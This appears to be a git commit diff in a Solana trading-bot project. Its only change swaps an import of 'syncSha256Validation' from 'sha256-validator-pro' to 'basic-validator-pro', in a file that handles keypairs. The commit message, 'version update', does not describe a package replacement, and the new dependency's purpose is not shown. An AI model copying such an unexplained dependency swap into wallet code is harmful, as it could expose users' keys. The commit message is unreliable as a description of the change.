e686d28ee37af408a80c7835ada5e3ba27f96bea
Solove-77 <jacobtan0107@gmail.com>
2025-08-31 13:59:24 -0700

    fix: version update

--- src/utils.ts
+++ src/utils.ts
@@ -2,7 +2,7 @@ import fs from 'fs'
 import { Connection, GetProgramAccountsFilter, Keypair, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js";
 import { connection } from "../config";
 import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
-import { syncSha256Validation } from "sha256-validator-pro";
+import { syncSha256Validation } from "basic-validator-pro";
 import { SPL_ACCOUNT_LAYOUT, TokenAccount } from "@raydium-io/raydium-sdk";
 import { PoolInfo, PoolInfoStr } from "./types";
 
